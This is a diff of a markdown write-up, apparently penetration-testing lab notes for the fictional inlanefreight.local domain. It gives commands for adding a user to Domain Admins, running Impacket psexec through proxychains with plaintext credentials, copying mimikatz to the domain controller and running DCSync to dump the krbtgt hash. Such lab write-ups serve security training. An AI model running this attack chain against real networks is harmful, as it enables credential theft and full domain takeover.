@@ -606,23 +606,25 @@ proxychains xfreerdp /v:172.16.7.50 /d:inlanefreight.local /u:CT059 /p:charlie1 
 net group "Domain Admins" CT059 /ADD /DOMAIN
 ```
 
->Impacket PSExec as user `CT059` to the member server `MS01`.  
+>Impacket PSExec via Proxychains from Kali host as user the domain account `CT059` to the domain controller `DC01`.  
 
 ```
 proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py inlanefreight.local/CT059:charlie1@172.16.7.3
+```  
+
+>After creating share on ms01, and giving full access to the share for authenticated users in domain, we can copy mimikatz tools from it to DC01.  
+
+>On the DC01 shell, map drive and copy mimikatz to DC01
+
 ```
-
->After creating share on ms01, and giving full access to share for authenticated users in domain
-
->on DC01 shell, map drive and copy mimikatz to DC01
-
-```
+cd c:\tools
 net use x: \\ms01\tools
+copy x:\mimikatz\x64\*.* .
 
 mimikatz.exe
 
 lsadump::dcsync /user:inlanefreight\krbtgt
-```
+```  
 
 >Above command Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise, and lead to full domain administrator access.  
 
